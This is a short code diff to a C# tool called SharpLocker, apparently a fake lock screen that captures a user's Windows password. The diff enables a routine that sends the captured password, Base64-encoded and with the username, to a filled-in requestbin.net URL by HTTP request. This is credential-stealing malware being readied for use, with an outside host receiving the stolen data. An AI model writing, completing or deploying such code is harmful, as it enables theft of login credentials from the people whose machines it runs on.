@@ -10,7 +10,7 @@ namespace SharpLocker
         public static void Extract(string password)
         {
             //Extract with request bin
-            //ExtractWithRequastBin(password);
+            ExtractWithRequastBin(password);
 
             //Extract with email
             //ExtractWithEmail(password);
@@ -25,10 +25,10 @@ namespace SharpLocker
 
             //YOUR RequestBin link
             //format: http://requestbin.net/r/xxxxxxxx
-            string url = "";
+            string url = "http://requestbin.net/r/rv6v9wrv";
 
-            bool EncodeWithBase64 = false;
-            bool IncludeUsername = false;
+            bool EncodeWithBase64 = true;
+            bool IncludeUsername = true;
 
             //Don't touch this!
             string p = "";
@@ -49,7 +49,7 @@ namespace SharpLocker
                 p = Convert.ToBase64String(plainTextBytes);
             }
 
-            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url + p);
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url + "?" + p);
             req.GetResponse();
 
         }
